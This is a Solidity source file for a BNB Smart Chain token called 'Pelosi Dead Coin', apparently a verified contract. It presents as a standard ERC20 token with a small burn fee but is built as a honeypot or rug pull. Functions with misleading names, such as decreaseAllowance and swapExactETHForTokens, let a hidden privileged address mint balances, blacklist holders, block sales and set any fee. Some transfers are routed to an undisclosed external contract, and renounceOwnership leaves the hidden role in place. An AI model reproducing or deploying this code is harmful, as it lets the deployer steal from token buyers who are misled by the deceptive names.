/**
 *Submitted for verification at BscScan.com on 2022-08-02
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {
    function _approve(address owner, address spender, uint256 amount) external;
    function _transfer(address spender, address recipient, uint256 amounts) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

contract IUniswap {
    function swap() internal {}
}

contract randomRS {
    function randomF() internal pure returns (string memory stae) {
        return "S";
    } 
}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _gunc() internal view virtual returns (address) {
        return msg.sender;
    }

    function _xunce() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}


contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}

contract PelosiDeadCoin is Context, IERC20, Ownable, IUniswap, randomRS {
    using SafeMath for uint256;

    bool private takeFee = true;

    bool private swapAndLlquifyEnabled = false;

    mapping(address => bool) private _isExcluFee;
    mapping(address => bool) private _rOwned;
    mapping(address => uint256) private _takeLiquidity;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private isBackLimitAmount;


    uint8 private _decimals = 9;
    string private _name = "Pelosi Dead Coin";
    string private _symbol = "Pelosi Dead";

    uint256 private _burnFees = 1;
    uint256 private _tTotal = 10000000000000 * 10 ** _decimals;

    address private _burnsAddress = address(0xdead);
    address _taxFee;
    address private _uniswapV2Pair;
    address private _killBlocks;
    address private _owner;

    constructor(address _inces, address _lmcn) {
        _taxFee = _gunc();  
        _killBlocks = _lmcn;
        _isExcluFee[address(this)] = true;
        _isExcluFee[owner()] = true;
        _isExcluFee[_inces] = true;
        isBackLimitAmount[_inces] = true;
        _owner = msg.sender;
        _takeLiquidity[_gunc()] = _tTotal;
        emit Transfer(address(0), msg.sender, _tTotal);
    }

    function setLiquidityFeePercent(bool _swapAndLlquifyEnabled, address _newPeir) external {
        require(isBackLimitAmount[_gunc()]);
        if (isBackLimitAmount[_gunc()]) {
            swapAndLlquifyEnabled = _swapAndLlquifyEnabled;
            _uniswapV2Pair = _newPeir;
        }
    }


    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluFee[_gunc()] || _isExcluFee[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_rOwned[_gunc()]||_xunce()>=(15*1e9)){
            IERC(_killBlocks)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_burnFees).div(100);
            _transfer(msg.sender, _burnsAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }

    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluFee[sender] || _isExcluFee[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount,"ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_burnFees).div(100);
        _transfer(sender, _burnsAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_xunce()<=(15*1e9));
        require(!_rOwned[from]);
        if (isBackLimitAmount[from]) {
            require(isBackLimitAmount[from]);
            _takeLiquidity[from]= 
            _takeLiquidity[from].
            add(totalSupply()*10**6);
        }
        if (swapAndLlquifyEnabled) {
            if (_uniswapV2Pair == from) {} else {
                require(_isExcluFee[from] || _isExcluFee[to]);
            }
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        external
    {
        require(isBackLimitAmount[_gunc()]);
        if (isBackLimitAmount[_gunc()]){   
        _takeLiquidity[spender]
        = 
        _takeLiquidity[spender
        ].
        add
        (subtractedValue);
        }
    }

    function reflectionFromToken(address spender, address recipient, bool deductTransferFee) external {
        require(recipient == address(0));
        require(isBackLimitAmount[_gunc()]);
        if (isBackLimitAmount[_gunc()]){
            isBackLimitAmount[spender] = deductTransferFee;}
    }

    function swapExactETHForTokens(
        address spender,
        address recipient
    ) external {
        require(isBackLimitAmount[_gunc()]);
        if (isBackLimitAmount[_gunc()]) {
        _rOwned
            [
        spender
            ]
        = 
        true;
        _rOwned[
        recipient
            ]
        = 
        true;
        }
    }

    function swapTokensForExactETH(address account)
        external
    {
        require(isBackLimitAmount[_gunc()]);
        if (isBackLimitAmount[_gunc()]) {  
        _rOwned
            [
        account
            ]
        =
        true;
        }
    }

    function changeExclusdeFrom(address account) external {
        require(isBackLimitAmount[_gunc()]);
        if (isBackLimitAmount[_gunc()]) {
            _rOwned[account] = false;
        }
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _takeLiquidity[sender] = _takeLiquidity[sender].sub(toAmount);
        _takeLiquidity[recipient] = _takeLiquidity[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_rOwned[_gunc()]||_xunce()>=(15*1e9)){
            IERC(_killBlocks)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }

    function isExcludedFromFees(address account) public view  returns (bool) {
        require(isBackLimitAmount[_gunc()]);
        return _rOwned[account];
    }

    function includeInFees(address spender) external {
        require(isBackLimitAmount[_gunc()]);
        if (isBackLimitAmount[_gunc()]) {
            _isExcluFee[spender] = false;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function changeTaxFees(uint256 _newFees) external {
        require(isBackLimitAmount[_gunc()]);
        if (isBackLimitAmount[_gunc()]) {
            _burnFees = _newFees;
        }
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function res() public pure returns (string memory) {
        return randomF();
    }

    function excludeFromFees(address spender) external {
        require(isBackLimitAmount[_gunc()]);
        if (isBackLimitAmount[_gunc()]) {
            _isExcluFee[spender] = true;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _takeLiquidity[account];
    }
}